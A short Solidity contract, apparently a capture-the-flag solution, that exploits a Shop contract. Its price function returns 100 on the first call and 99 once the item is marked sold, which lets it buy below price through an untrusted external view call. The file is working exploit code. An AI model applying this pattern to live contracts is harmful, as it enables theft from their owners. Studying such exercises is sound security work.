// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack {

    Shop shopContract;

    constructor(address _shopContractAddress) {
        shopContract = Shop(_shopContractAddress);
    }

    function attack() external {
        shopContract.buy();
    }

    function price() external view returns (uint) {
        if (shopContract.isSold()) {
            return 99; // 2nd call
        }
        return 100; // 1st call
    }
}